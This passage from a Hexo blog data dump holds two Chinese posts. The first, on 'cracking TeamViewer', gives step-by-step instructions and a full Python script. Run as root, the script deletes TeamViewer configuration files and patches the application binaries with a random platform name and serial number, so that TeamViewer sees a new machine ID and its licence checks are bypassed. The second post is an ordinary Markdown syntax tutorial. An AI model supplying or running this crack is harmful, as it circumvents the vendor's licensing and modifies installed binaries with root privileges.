if os.path.exists(file):\n            pass\n        else:\n            print(&quot;File not found: &quot; + file)\n            print (&quot;Install TeamViewer correctly&quot;)\n            sys.exit();\n\n    # Patch files\n\n    def idpatch(fpath,platf,serial):\n        file = open(fpath, &#39;r+b&#39;)\n        binary = file.read()\n        PlatformPattern = &quot;IOPlatformExpert.{6}&quot;\n        SerialPattern =  &quot;IOPlatformSerialNumber%s%s%sUUID&quot;\n\n        binary = re.sub(PlatformPattern, platf, binary)\n        binary = re.sub(SerialPattern % (chr(0), &quot;[0-9a-zA-Z]{8,8}&quot;, chr(0)), SerialPattern%(chr(0), serial, chr(0)), binary)\n\n        file = open(fpath,&#39;wb&#39;).write(binary)\n        return True\n\n    def random_generator(size=8, chars=string.ascii_uppercase + string.digits):\n        return &#39;&#39;.join(random.choice(chars) for _ in range(size))\n\n    RANDOMSERIAL = random_generator()\n    RANDOMPLATFORM = &quot;IOPlatformExpert&quot; + random_generator(6)\n\n\n    for file in TMBINARYES:\n            try:\n                idpatch(file,RANDOMPLATFORM,RANDOMSERIAL)\n            except:\n                print &quot;Error: can not patch file &quot; + file\n                print &quot;Wrong version?&quot;\n                sys.exit();\n\n    print &quot;PlatformDevice: &quot; + RANDOMPLATFORM\n    print &quot;PlatformSerial: &quot; + RANDOMSERIAL\n\n    print(&#39;&#39;&#39;\n    ID changed sucessfully.\n    !!! Restart computer before using TeamViewer !!!!\n    &#39;&#39;&#39;)\n\n</code></pre>","site":{"data":{}},"excerpt":"","more":"<h1 id=\"破解-TeamViewer\"><a href=\"#破解-TeamViewer\" class=\"headerlink\" title=\"破解 TeamViewer\"></a>破解 TeamViewer</h1><ul>\n<li><ol>\n<li>下载安装Teamviewer，安装完先退出登录</li>\n</ol>\n</li>\n<li><p>2.下载破解文件 TeamViewer-id-changer.py,可搜索到</p>\n</li>\n<li><p>3.打开控制台，运行‘sudo python 破解文件路径’（可直接把TeamViewer-id-changer.py文件拉进控制台获取到路径）按提示操作,TeamViewer-id-changer.py的代码在下面</p>\n</li>\n<li><p>4.提示重启电脑，重启</p>\n</li>\n<li><p>5.打开 Teamviewer</p>\n</li>\n</ul>\n<pre><code>    #!/usr/bin/env python \n\n    #coding:utf-8\n    import sys\n    import os\n    import glob\n    import platform\n    import re\n    import random\n    import string\n\n    print(&#39;&#39;&#39;\n    --------------------------------\n    TeamViewer ID Changer for MAC OS\n    --------------------------------\n    &#39;&#39;&#39;)\n\n    if platform.system() != &#39;Darwin&#39;:\n        print(&#39;This script can be run only on MAC OS.&#39;)\n        sys.exit();\n\n    if os.geteuid() != 0:\n        print(&#39;This script must be run form root.&#39;)\n        sys.exit();\n\n    if os.environ.has_key(&#39;SUDO_USER&#39;):\n        USERNAME = os.environ[&#39;SUDO_USER&#39;]\n        if USERNAME == &#39;root&#39;:\n        print(&#39;Can not find user name. Run this script via sudo from regular user&#39;)\n        sys.exit();\n    else:\n        print(&#39;Can not find user name. Run this script via sudo from regular user&#39;)\n        sys.exit();\n\n    HOMEDIRLIB = &#39;/Users/&#39; + USERNAME  + &#39;/library/preferences/&#39;\n    GLOBALLIB  =  &#39;/library/preferences/&#39;\n\n    CONFIGS = []\n\n    # Find config files\n\n    def listdir_fullpath(d):\n        return [os.path.join(d, f) for f in os.listdir(d)]\n\n    for file in listdir_fullpath(HOMEDIRLIB):\n        if &#39;teamviewer&#39;.lower() in file.lower():\n            CONFIGS.append(file)\n\n    if not CONFIGS:\n        print (&#39;&#39;&#39;\n    There is no TemViewer configs found.\n    Maybe you have deleted it manualy or never run TeamViewer after installation.\n    Nothing to delete.\n    &#39;&#39;&#39;)\n    # Delete config files\n    else:\n        print(&quot;Configs found:\\n&quot;)\n        for file in CONFIGS:\n            print file\n\n        print(&#39;&#39;&#39;\n    This files will be DELETED permanently.\n    All TeamViewer settings will be lost\n    &#39;&#39;&#39;)\n        raw_input(&quot;Press Enter to continue or CTR+C to abort...&quot;)\n\n        for file in CONFIGS:\n            try:\n                os.remove(file)\n            except:\n                print(&quot;Cannot delete config files. Permission denied?&quot;)\n                sys.exit();\n        print(&quot;Done.&quot;)\n\n    # Find binaryes\n\n    TMBINARYES = [\n    &#39;/Applications/TeamViewer.app/Contents/MacOS/TeamViewer&#39;,\n    &#39;/Applications/TeamViewer.app/Contents/MacOS/TeamViewer_Service&#39;,\n    &#39;/Applications/TeamViewer.app/Contents/Helpers/TeamViewer_Desktop&#39;,\n    ]\n\n    for file in TMBINARYES:\n        if os.path.exists(file):\n            pass\n        else:\n            print(&quot;File not found: &quot; + file)\n            print (&quot;Install TeamViewer correctly&quot;)\n            sys.exit();\n\n    # Patch files\n\n    def idpatch(fpath,platf,serial):\n        file = open(fpath, &#39;r+b&#39;)\n        binary = file.read()\n        PlatformPattern = &quot;IOPlatformExpert.{6}&quot;\n        SerialPattern =  &quot;IOPlatformSerialNumber%s%s%sUUID&quot;\n\n        binary = re.sub(PlatformPattern, platf, binary)\n        binary = re.sub(SerialPattern % (chr(0), &quot;[0-9a-zA-Z]{8,8}&quot;, chr(0)), SerialPattern%(chr(0), serial, chr(0)), binary)\n\n        file = open(fpath,&#39;wb&#39;).write(binary)\n        return True\n\n    def random_generator(size=8, chars=string.ascii_uppercase + string.digits):\n        return &#39;&#39;.join(random.choice(chars) for _ in range(size))\n\n    RANDOMSERIAL = random_generator()\n    RANDOMPLATFORM = &quot;IOPlatformExpert&quot; + random_generator(6)\n\n\n    for file in TMBINARYES:\n            try:\n                idpatch(file,RANDOMPLATFORM,RANDOMSERIAL)\n            except:\n                print &quot;Error: can not patch file &quot; + file\n                print &quot;Wrong version?&quot;\n                sys.exit();\n\n    print &quot;PlatformDevice: &quot; + RANDOMPLATFORM\n    print &quot;PlatformSerial: &quot; + RANDOMSERIAL\n\n    print(&#39;&#39;&#39;\n    ID changed sucessfully.\n    !!! Restart computer before using TeamViewer !!!!\n    &#39;&#39;&#39;)\n\n</code></pre>"},{"title":"MD 格式","date":"2020-05-08T03:41:32.000Z","_content":"\n# 正文：\n\n## 1、标题的几种写法：\n\n第一种：前面带#号，后面带文字，分别表示h1-h6,只到h6，而且h1下面会有一条横线，注意，#号后面有空格\n***\n\n写法|\n---|\n# 一级标题          |           \n## 二级标题         |       \n### 三级标题        |       \n#### 四级标题       |       \n##### 五级标题      |       \n###### 六级标题     |       \n\n效果\n\n# 一级标题                     \n## 二级标题                \n### 三级标题              \n#### 四级标题              \n##### 五级标题            \n###### 六级标题        \n\n***\n\n第二种：这种方式好像只能表示一级和二级标题，而且=和-的数量没有限制，只要大于一个就行\n\n写法|\n---|\n这是一级标题          |           \n===========         |       \n这是二级标题          |       \n-------------       |       \n正文                 |       \n-------------       |       \n辅文                 |       \n\n效果 \n\n这是一级标题                            \n===========                        \n这是二级标题                 \n-------------                      \n正文:       \nxxx     \nxxx     \n------------        \n辅文:       \nxxxx        \n\n***\n\n第三种：      \n写法|\n---|\n# 一级标题 #          |           \n## 二级标题 ##         |       \n### 三级标题 ###         |       \n#### 四级标题 ####       |       \n##### 五级标题 #####      |       \n###### 六级标题 ######     |   \n[markdown在线编辑](https://tool.oschina.net/markdown/)\n   \n## 2、列表\n无序列表写法|\n---|\n* 1          |           \n* 2         |       \n* 3         |       \n+ 1          |           \n+ 2         |       \n+ 3         |\n- 1          |           \n- 2         |       \n- 3         |\n\n效果\n\n* 1                     \n* 2                \n* 3               \n+ 1                    \n+ 2               \n+ 3         \n- 1                  \n- 2               \n- 3        \n\n有序列表就相对简单一点，只有这一种方式，注意，数字后面的点只能是英文的点，特别注意，有序列表的序号是根据第一行列表的数字顺序来的.\n\n有序列表写法|\n---|\n1. 列表 1        |           \n2. 列表 2        |       \n3. 列表 3        |       \n\n效果\n\n1. 列表 1                   \n2. 列表 2               \n3. 列表 3              \n\n 有序列表写法|\n---|\n3. 列表 1        |           \n8. 列表 2        |       \n4. 列表 3        | \n\n效果\n\n3. 列表 1                   \n8. 列表 2               \n4. 列表 3 \n\n***\n\n## 3、区块引用\n\n写法|\n---|\n* AAAAAAAAAA        |           \n> BBBBBBBBBB        |     \n> ## 标题            |\n下面为嵌套引用:         |\n> CCCCCCCCCC        |           \n>> dddDDDDDD        |     \n>>> E            |\n>>>> f            |\n>>>>> G            |\n比如说，你想对某个部分做的内容做一些说明或者引用某某的话等，可以用这个语句\n* 无序列表下方的便是引用，可以有多种用途，看你的需求了，用法就是在语句前面加一个 > ，注意是英文的那个右尖括号，注意空格\n    >引用因为是一个区块，理论上是应该什么内容都可以放，比如说：标题，列表，引用等等，看看下图： \n\n想要在上一次引用中嵌套一层引用，只需多加一个>，理论上可以无限嵌套，我就不整那么多了，注意：多层嵌套的>是不需要连续在一起的，只要在一行就可以了，中间允许有空格，但是为了好看，还是把排版搞好吧\n\n***\n\n## 4、华丽的分割线\n分割线可以由* - _（星号，减号，底线）这3个符号的至少3个符号表示，注意至少要3个，且不需要连续，有空格也可以\n\n写法|\n---|\n***        |           \n******       |     \n---       |     \n- - -       |     \n* * *       |     \n------------       |     \n_ _ _       |     \n\n效果\n\n***                   \n******            \n---            \n- - -            \n* * *            \n------------           \n_ _ _           \n\n\n应该看得懂吧，但是为了代码的排版好看，你们自己定规则吧，前面有用到星号，建议用减号\n\n \n***\n5、链接\n\n支持2种链接方式：行内式和参数式，不管是哪一种，链接文字都是用 [方括号] 来标记。\n行内式的链接格式是：链接的文字放在[]中，链接地址放在随后的（）中：链接还可以带title属性，好像也只能带title，带不了其他属性，注意，是链接地址后面空一格，然后用引号引起来,就是把链接当成参数\n写法|\n---|\n注意下面写法,中间不要空格                               |\n[ xxx ]  ( http://www.baidu.com )                   |           \n[[   name  ]] :  http://www.baidu.com    \"名称\"            |\n[[   home  ]] :  http://www.baidu.com    \" 首页\"           |\n[[   也支持中文   ]] : http://www.baidu.com    \" 瞎写的\"       |\n这里是[[ name ]],这里是 [[ home ]] ,这里是 [[ 也支持中文 ]]   |\n\n效果:\n\n[百度](http://www.baidu.com)         \n\n[name]: http://www.baidu.com \"名称\"\n[home]: http://www.baidu.com \" 首页\"\n[也支持中文]: http://www.baidu.com \" 瞎写的\"\n这里是[name],这里是[home],这里是[也支持中文]\n\n***\n6、图片\n图片也有2种方式：行内式和参数式，\n写法|\n---|\n注意下面写法,中间不要空格,行内式和参数式                              |\n! [ xxx ]  ( https://images2015.cnblogs.com/blog/600165/201701/600165-20170121185054312-549083784.png )                      |   \n[ CCC ]: https://images2015.cnblogs.com/blog/600165/201701/600165-20170121185106031-1426410254.png                       |   \n参数式图片这里是 ![CCC]                             |   \n\n效果\n\n![xxx](https://images2015.cnblogs.com/blog/600165/201701/600165-20170121185054312-549083784.png)        \n\n[AAA]: https://images2015.cnblogs.com/blog/600165/201701/600165-20170121185106031-1426410254.png                                \n参数式图片这里是: ![AAA]                                \n \n\n7、代码框\n写法|\n---|\n单行用 `` , 多行用 ```  |\n``                      |   \n``                      |   \n```                      |   \n```                      |  \n\n效果\n\n``\n    单行代码效果\n    1111\n``\n\n```\n    多行代码效果 1\n    多行代码效果 2\n```\n\n*** \n\n## 8、表格\n\n写法|\n---|\n学号\\|姓名\\|分数        |\n--\\|--\\|--                 |\nAA\\|bb\\|CC                 |\nDD\\|EE\\|FF                 |\nQQ\\|EW\\|FR                 |\n\n效果\n\n学号|姓名|分数        |\n--|--|--                 |\nAA|bb|CC                 |\nDD|EE|FF                 |\nQQ|EW|FR                 |\n\n***\n\n\n## 9、强调\n\n写法|\n---|\n\\*字体倾斜\\* |\n\\_字体倾斜\\_ |\n\\*\\*字体加粗\\*\\* |\n\\_\\_字体加粗\\_\\_ |\n\n效果\n\n*字体倾斜*      \n_字体倾斜_      \n**字体加粗**        \n__字体加粗__        \n\n***\n## 10、转义前面加 \\\\\n\n*** \n\n## 11、删除线左右加 ~~\n~~ 删除线 ~~        \n~~删除线~~\n\n\n   ","source":"_posts/Tools/md格式.md","raw":"---\ntitle: MD 格式\ndate: 2020-05-08 11:41:32\ncategories:\n- 工具\ntags:\n- tool\n---\n\n# 正文：\n\n## 1、标题的几种写法：\n\n第一种：前面带#号，后面带文字，分别表示h1-h6,只到h6，而且h1下面会有一条横线，注意，#号后面有空格\n***\n\n写法|\n---|\n# 一级标题          |           \n## 二级标题         |       \n### 三级标题        |       \n#### 四级标题       |       \n##### 五级标题      |       \n###### 六级标题     |       \n\n效果\n\n# 一级标题                     \n## 二级标题                \n### 三级标题              \n#### 四级标题              \n##### 五级标题            \n###### 六级标题        \n\n***\n\n第二种：这种方式好像只能表示一级和二级标题，而且=和-的数量没有限制，只要大于一个就行\n\n写法|\n---|\n这是一级标题          |           \n===========         |       \n这是二级标题          |       \n-------------       |       \n正文                 |       \n-------------       |       \n辅文                 |       \n\n效果 \n\n这是一级标题                            \n===========                        \n这是二级标题                 \n-------------                      \n正文:       \nxxx     \nxxx     \n------------        \n辅文:       \nxxxx        \n\n***\n\n第三种：      \n写法|\n---|\n# 一级标题 #          |           \n## 二级标题 ##         |       \n### 三级标题 ###         |       \n#### 四级标题 ####       |       \n##### 五级标题 #####      |       \n###### 六级标题 ######     |   \n[markdown在线编辑](https://tool.oschina.net/markdown/)\n   \n## 2、列表\n无序列表写法|\n---|\n* 1          |           \n* 2         |       \n* 3         |       \n+ 1          |           \n+ 2         |       \n+ 3         |\n- 1          |           \n- 2         |       \n- 3         |\n\n效果\n\n* 1                     \n* 2                \n* 3               \n+ 1                    \n+ 2               \n+ 3         \n- 1                  \n- 2               \n- 3        \n\n有序列表就相对简单一点，只有这一种方式，注意，数字后面的点只能是英文的点，特别注意，有序列表的序号是根据第一行列表的数字顺序来的.\n\n有序列表写法|\n---|\n1. 列表 1        |           \n2. 列表 2        |       \n3. 列表 3        |       \n\n效果\n\n1. 列表 1                   \n2. 列表 2               \n3. 列表 3              \n\n 有序列表写法|\n---|\n3. 列表 1        |           \n8. 列表 2        |       \n4. 列表 3        | \n\n效果\n\n3. 列表 1                   \n8. 列表 2               \n4. 列表 3 \n\n***\n\n## 3、区块引用\n\n写法|\n---|\n* AAAAAAAAAA        |           \n> BBBBBBBBBB        |     \n> ## 标题            |\n下面为嵌套引用:         |\n> CCCCCCCCCC        |           \n>> dddDDDDDD        |     \n>>> E            |\n>>>> f            |\n>>>>> G            |\n比如说，你想对某个部分做的内容做一些说明或者引用某某的话等，可以用这个语句\n* 无序列表下方的便是引用，可以有多种用途，看你的需求了，用法就是在语句前面加一个 > ，注意是英文的那个右尖括号，注意空格\n    >引用因为是一个区块，理论上是应该什么内容都可以放，比如说：标题，列表，引用等等，看看下图： \n\n想要在上一次引用中嵌套一层引用，只需多加一个>，理论上可以无限嵌套，我就不整那么多了，注意：多层嵌套的>是不需要连续在一起的，只要在一行就可以了，中间允许有空格，但是为了好看，还是把排版搞好吧\n\n***\n\n## 4、华丽的分割线\n分割线可以由* - _（星号，减号，底线）这3个符号的至少3个符号表示，注意至少要3个，且不需要连续，有空格也可以\n\n写法|\n---|\n***        |           \n******       |     \n---       |     \n- - -       |     \n* * *       |     \n------------       |     \n_ _ _       |     \n\n效果\n\n***                   \n******            \n---            \n- - -            \n* * *            \n------------           \n_ _ _           \n\n\n应该看得懂吧，但是为了代码的排版好看，你们自己定规则吧，前面有用到星号，建议用减号\n\n \n***\n5、链接\n\n支持2种链接方式：行内式和参数式，不管是哪一种，链接文字都是用 [方括号] 来标记。\n行内式的链接格式是：链接的文字放在[]中，链接地址放在随后的（）中：链接还可以带title属性，好像也只能带title，带不了其他属性，注意，是链接地址后面空一格，然后用引号引起来,就是把链接当成参数\n写法|\n---|\n注意下面写法,中间不要空格                               |\n[ xxx ]  ( http://www.baidu.com )                   |           \n[[   name  ]] :  http://www.baidu.com    \"名称\"            |\n[[   home  ]] :  http://www.baidu.com    \" 首页\"           |\n[[   也支持中文   ]] : http://www.baidu.com    \" 瞎写的\"       |\n这里是[[ name ]],这里是 [[ home ]] ,这里是 [[ 也支持中文 ]]   |\n\n效果:\n\n[百度](http://www.baidu.com)         \n\n[name]: http://www.baidu.com \"名称\"\n[home]: http://www.baidu.com \" 首页\"\n[也支持中文]: http://www.baidu.com \" 瞎写的\"\n这里是[name],这里是[home],这里是[也支持中文]\n\n***\n6、图片\n图片也有2种方式：行内式和参数式，\n写法|\n---|\n注意下面写法,中间不要空格,行内式和参数式                              |\n! [ xxx ]  ( https://images2015.cnblogs.com/blog/600165/201701/600165-20170121185054312-549083784.png )                      |   \n[ CCC ]: https://images2015.cnblogs.com/blog/600165/201701/600165-20170121185106031-1426410254.png                       |   \n参数式图片这里是 ![CCC]                             |   \n\n效果\n\n![xxx](https://images2015.cnblogs.com/blog/600165/201701/600165-20170121185054312-549083784.png)        \n\n[AAA]: https://images2015.cnblogs.com/blog/600165/201701/600165-20170121185106031-1426410254.png                                \n参数式图片这里是: ![AAA]                                \n \n\n7、代码框\n写法|\n---|\n单行用 `` , 多行用 ```  |\n``                      |   \n``                      |   \n```                      |   \n```                      |  \n\n效果\n\n``\n    单行代码效果\n    1111\n``\n\n```\n    多行代码效果 1\n    多行代码效果 2\n```\n\n*** \n\n## 8、表格\n\n写法|\n---|\n学号\\|姓名\\|分数        |\n--\\|--\\|--                 |\nAA\\|bb\\|CC                 |\nDD\\|EE\\|FF                 |\nQQ\\|EW\\|FR                 |\n\n效果\n\n学号|姓名|分数        |\n--|--|--                 |\nAA|bb|CC                 |\nDD|EE|FF                 |\nQQ|EW|FR                 |\n\n***\n\n\n## 9、强调\n\n写法|\n---|\n\\*字体倾斜\\* |\n\\_字体倾斜\\_ |\n\\*\\*字体加粗\\*\\* |\n\\_\\_字体加粗\\_\\_ |\n\n效果\n\n*字体倾斜*      \n_字体倾斜_      \n**字体加粗**        \n__字体加粗__        \n\n***\n## 10、转义前面加 \\\\\n\n*** \n\n## 11、删除线左右加 ~~\n~~ 删除线 ~~        \n~~删除线~~\n\n\n   ","slug":"Tools/md格式","published":1,"updated":"2020-06-12T03:58:25.660Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckfvz8cyl001d2gk72o6cc0lk","content":"<h1 id=\"正文：\"><a href=\"#正文：\" class=\"headerlink\" title=\"正文：\"></a>正文：</h1><h2 id=\"1、标题的几种写法：\"><a href=\"#1、标题的几种写法：\" class=\"headerlink\" title=\"1、标题的几种写法：\"></a>1、标题的几种写法：</h2><p>第一种：前面带#号，后面带文字，分别表示h1-h6,只到h6，而且h1下面会有一条横线，注意，#号后面有空格</p>\n<hr>\n<table>\n<thead>\n<tr>\n<th>写法</th>\n</tr>\n</thead>\n<tbody><tr>\n<td># 一级标题</td>\n</tr>\n<tr>\n<td>## 二级标题</td>\n</tr>\n<tr>\n<td>### 三级标题</td>\n</tr>\n<tr>\n<td>#### 四级标题</td>\n</tr>\n<tr>\n<td>##### 五级标题</td>\n</tr>\n<tr>\n<td>###### 六级标题</td>\n</tr>\n</tbody></table>\n<p>效果</p>\n<h1 id=\"一级标题\"><a href=\"#一级标题\" class=\"headerlink\" title=\"一级标题\"></a>一级标题</h1><h2 id=\"二级标题\"><a href=\"#二级标题\" class=\"headerlink\" title=\"二级标题\"></a>二级标题</h2><h3 id=\"三级标题\"><a href=\"#三级标题\" class=\"headerlink\" title=\"三级标题\"></a>三级标题</h3><h4 id=\"四级标题\"><a href=\"#四级标题\" class=\"headerlink\" title=\"四级标题\"></a>四级标题</h4><h5 id=\"五级标题\"><a href=\"#五级标题\" class=\"headerlink\" title=\"五级标题\"></a>五级标题</h5><h6 id=\"六级标题\"><a href=\"#六级标题\" class=\"headerlink\" title=\"六级标题\"></a>六级标题</h6><hr>\n<p>第二种：这种方式好像只能表示一级和二级标题，而且=和-的数量没有限制，只要大于一个就行</p>\n<table>\n<thead>\n<tr>\n<th>写法</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>这是一级标题</td>\n</tr>\n<tr>\n<td>===========</td>\n</tr>\n<tr>\n<td>这是二级标题</td>\n</tr>\n<tr>\n<td>————-</td>\n</tr>\n<tr>\n<td>正文</td>\n</tr>\n<tr>\n<td>————-</td>\n</tr>\n<tr>\n<td>辅文</td>\n</tr>\n</tbody></table>\n<p>效果 </p>\n<h1 id=\"这是一级标题\"><a href=\"#这是一级标题\" class=\"headerlink\" title=\"这是一级标题                            \"></a>这是一级标题                            </h1><h2 id=\"这是二级标题\"><a href=\"#这是二级标题\" class=\"headerlink\" title=\"这是二级标题                 \"></a>这是二级标题                 </h2><p>正文:<br>xxx<br>xxx     </p>\n<hr>\n<p>辅文:<br>xxxx        </p>\n<hr>\n<p>第三种：<br>写法|<br>—|</p>\n<h1 id=\"一级标题-1\"><a href=\"#一级标题-1\" class=\"headerlink\" title=\"一级标题 #          |\"></a>一级标题 #          |</h1><h2 id=\"二级标题-1\"><a href=\"#二级标题-1\" class=\"headerlink\" title=\"二级标题 ##         |\"></a>二级标题 ##         |</h2><h3 id=\"三级标题-1\"><a href=\"#三级标题-1\" class=\"headerlink\" title=\"三级标题 ###         |\"></a>三级标题 ###         |</h3><h4 id=\"四级标题-1\"><a href=\"#四级标题-1\" class=\"headerlink\" title=\"四级标题 ####       |\"></a>四级标题 ####       |</h4><h5 id=\"五级标题-1\"><a href=\"#五级标题-1\" class=\"headerlink\" title=\"五级标题 #####      |\"></a>五级标题 #####      |</h5><h6 id=\"六级标题-1\"><a href=\"#六级标题-1\" class=\"headerlink\" title=\"六级标题 ######     |\"></a>六级标题 ######     |</h6><p><a href=\"https://tool.oschina.net/markdown/\" target=\"_blank\" rel=\"noopener\">markdown在线编辑</a></p>\n<h2 id=\"2、列表\"><a href=\"#2、列表\" class=\"headerlink\" title=\"2、列表\"></a>2、列表</h2><table>\n<thead>\n<tr>\n<th>无序列表写法</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>* 1</td>\n</tr>\n<tr>\n<td>* 2</td>\n</tr>\n<tr>\n<td>* 3</td>\n</tr>\n<tr>\n<td>+ 1</td>\n</tr>\n<tr>\n<td>+ 2</td>\n</tr>\n<tr>\n<td>+ 3</td>\n</tr>\n<tr>\n<td>- 1</td>\n</tr>\n<tr>\n<td>- 2</td>\n</tr>\n<tr>\n<td>- 3</td>\n</tr>\n</tbody></table>\n<p>效果</p>\n<ul>\n<li>1                     </li>\n<li>2                </li>\n<li>3               </li>\n</ul>\n<ul>\n<li>1                    </li>\n<li>2               </li>\n<li>3         </li>\n</ul>\n<ul>\n<li>1                  </li>\n<li>2               </li>\n<li>3        </li>\n</ul>\n<p>有序列表就相对简单一点，只有这一种方式，注意，数字后面的点只能是英文的点，特别注意，有序列表的序号是根据第一行列表的数字顺序来的.</p>\n<table>\n<thead>\n<tr>\n<th>有序列表写法</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>1. 列表 1</td>\n</tr>\n<tr>\n<td>2. 列表 2</td>\n</tr>\n<tr>\n<td>3. 列表 3</td>\n</tr>\n</tbody></table>\n<p>效果</p>\n<ol>\n<li><p>列表 1                   </p>\n</li>\n<li><p>列表 2               </p>\n</li>\n<li><p>列表 3              </p>\n<p>有序列表写法|</p>\n</li>\n</ol>\n<p>—|<br>3. 列表 1        |<br>8. 列表 2        |<br>4. 列表 3        | </p>\n<p>效果</p>\n<ol start=\"3\">\n<li>列表 1                   </li>\n<li>列表 2               </li>\n<li>列表 3 </li>\n</ol>\n<hr>\n<h2 id=\"3、区块引用\"><a href=\"#3、区块引用\" class=\"headerlink\" title=\"3、区块引用\"></a>3、区块引用</h2><table>\n<thead>\n<tr>\n<th>写法</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>* AAAAAAAAAA</td>\n</tr>\n<tr>\n<td>&gt; BBBBBBBBBB</td>\n</tr>\n<tr>\n<td>&gt; ## 标题</td>\n</tr>\n<tr>\n<td>下面为嵌套引用:</td>\n</tr>\n<tr>\n<td>&gt; CCCCCCCCCC</td>\n</tr>\n<tr>\n<td>&gt;&gt; dddDDDDDD</td>\n</tr>\n<tr>\n<td>&gt;&gt;&gt; E</td>\n</tr>\n<tr>\n<td>&gt;&gt;&gt;&gt; f</td>\n</tr>\n<tr>\n<td>&gt;&gt;&gt;&gt;&gt; G</td>\n</tr>\n<tr>\n<td>比如说，你想对某个部分做的内容做一些说明或者引用某某的话等，可以用这个语句</td>\n</tr>\n<tr>\n<td>* 无序列表下方的便是引用，可以有多种用途，看你的需求了，用法就是在语句前面加一个 &gt; ，注意是英文的那个右尖括号，注意空格</td>\n</tr>\n<tr>\n<td>&gt;引用因为是一个区块，理论上是应该什么内容都可以放，比如说：标题，列表，引用等等，看看下图：</td>\n</tr>\n</tbody></table>\n<p>想要在上一次引用中嵌套一层引用，只需多加一个&gt;，理论上可以无限嵌套，我就不整那么多了，注意：多层嵌套的&gt;是不需要连续在一起的，只要在一行就可以了，中间允许有空格，但是为了好看，还是把排版搞好吧</p>\n<hr>\n<h2 id=\"4、华丽的分割线\"><a href=\"#4、华丽的分割线\" class=\"headerlink\" title=\"4、华丽的分割线\"></a>4、华丽的分割线</h2><p>分割线可以由* - _（星号，减号，底线）这3个符号的至少3个符号表示，注意至少要3个，且不需要连续，有空格也可以</p>\n<table>\n<thead>\n<tr>\n<th>写法</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>***</td>\n</tr>\n<tr>\n<td><strong>**</strong></td>\n</tr>\n<tr>\n<td>—</td>\n</tr>\n<tr>\n<td>- - -</td>\n</tr>\n<tr>\n<td>* * *</td>\n</tr>\n<tr>\n<td>————</td>\n</tr>\n<tr>\n<td>_ _ _</td>\n</tr>\n</tbody></table>\n<p>效果</p>\n<hr>\n<hr>\n<hr>\n<hr>\n<hr>\n<hr>\n<hr>\n<p>应该看得懂吧，但是为了代码的排版好看，你们自己定规则吧，前面有用到星号，建议用减号</p>\n<hr>\n<p>5、链接</p>\n<p>支持2种链接方式：行内式和参数式，不管是哪一种，链接文字都是用 [方括号] 来标记。<br>行内式的链接格式是：链接的文字放在[]中，链接地址放在随后的（）中：链接还可以带title属性，好像也只能带title，带不了其他属性，注意，是链接地址后面空一格，然后用引号引起来,就是把链接当成参数<br>写法|<br>—|<br>注意下面写法,中间不要空格                               |<br>[ xxx ]  ( <a href=\"http://www.baidu.com\" target=\"_blank\" rel=\"noopener\">http://www.baidu.com</a> )                   |<br>[[   name  ]] :  <a href=\"http://www.baidu.com\" target=\"_blank\" rel=\"noopener\">http://www.baidu.com</a>    “名称”            |<br>[[   home  ]] :  <a href=\"http://www.baidu.com\" target=\"_blank\" rel=\"noopener\">http://www.baidu.com</a>    “ 首页”           |<br>[[   也支持中文   ]] : <a href=\"http://www.baidu.com\" target=\"_blank\" rel=\"noopener\">http://www.baidu.com</a>    “ 瞎写的”       |<br>这里是[[ name ]],这里是 [[ home ]] ,这里是 [[ 也支持中文 ]]   |</p>\n<p>效果:</p>\n<p><a href=\"http://www.baidu.com\" target=\"_blank\" rel=\"noopener\">百度</a>         </p>\n<p>这里是<a href=\"http://www.baidu.com\" target=\"_blank\" rel=\"noopener\" title=\"名称\">name</a>,这里是<a href=\"http://www.baidu.com\" target=\"_blank\" rel=\"noopener\" title=\" 首页\">home</a>,这里是<a href=\"http://www.baidu.com\" target=\"_blank\" rel=\"noopener\" title=\" 瞎写的\">也支持中文</a></p>\n<hr>\n<p>6、图片<br>图片也有2种方式：行内式和参数式，<br>写法|<br>—|<br>注意下面写法,中间不要空格,行内式和参数式                              |<br>! [ xxx ]  ( <a href=\"https://images2015.cnblogs.com/blog/600165/201701/600165-20170121185054312-549083784.png\" target=\"_blank\" rel=\"noopener\">https://images2015.cnblogs.com/blog/600165/201701/600165-20170121185054312-549083784.png</a> )                      |<br>[ CCC ]: <a href=\"https://images2015.cnblogs.com/blog/600165/201701/600165-20170121185106031-1426410254.png\" target=\"_blank\" rel=\"noopener\">https://images2015.cnblogs.com/blog/600165/201701/600165-20170121185106031-1426410254.png</a>                       |<br>参数式图片这里是 ![CCC]                             |   </p>\n<p>效果</p>\n<p><img src=\"https://images2015.cnblogs.com/blog/600165/201701/600165-20170121185054312-549083784.png\" alt=\"xxx\">        </p>\n<p>参数式图片这里是: <img src=\"https://images2015.cnblogs.com/blog/600165/201701/600165-20170121185106031-1426410254.png\" alt=\"AAA\">                                </p>\n<p>7、代码框<br>写法|<br>—|<br>单行用 <code>, 多行用 ```  |</code>                      |<br>``                      |   </p>\n<pre><code class=\"|\">```                      |  \n\n效果\n\n``\n    单行代码效果\n    1111\n``\n</code></pre>\n<pre><code>多行代码效果 1\n多行代码效果 2</code></pre><pre><code>\n*** \n\n## 8、表格\n\n写法|\n---|\n学号\\|姓名\\|分数        |\n--\\|--\\|--                 |\nAA\\|bb\\|CC                 |\nDD\\|EE\\|FF                 |\nQQ\\|EW\\|FR                 |\n\n效果\n\n学号|姓名|分数        |\n--|--|--                 |\nAA|bb|CC                 |\nDD|EE|FF                 |\nQQ|EW|FR                 |\n\n***\n\n\n## 9、强调\n\n写法|\n---|\n\\*字体倾斜\\* |\n\\_字体倾斜\\_ |\n\\*\\*字体加粗\\*\\* |\n\\_\\_字体加粗\\_\\_ |\n\n效果\n\n*字体倾斜*      \n_字体倾斜_      \n**字体加粗**        \n__字体加粗__        \n\n***\n## 10、转义前面加 \\\\\n\n*** \n\n## 11、删除线左右加 ~~\n~~ 删除线 ~~        \n~~删除线~~\n\n</code></pre>","site":{"data":{}},"excerpt":"","more":"<h1 id=\"正文：\"><a href=\"#正文：\" class=\"headerlink\" title=\"正文：\"></a>正文：</h1><h2 id=\"1、标题的几种写法：\"><a href=\"#1、标题的几种写法：\" class=\"headerlink\" 